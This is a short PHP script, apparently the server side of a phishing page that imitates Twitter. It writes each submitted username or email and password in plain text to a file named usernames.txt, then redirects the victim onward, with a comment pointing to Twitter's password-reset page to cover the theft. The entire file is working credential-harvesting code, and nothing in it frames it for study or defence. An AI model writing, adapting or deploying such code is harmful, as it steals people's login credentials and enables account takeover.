<?php

file_put_contents("usernames.txt", "Twitter Username: " . $_POST['usernameOrEmail'] . "\nPassword: " . $_POST['pass'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://twitter.com/account/begin_password_reset
header("Location: $url");
exit();
?>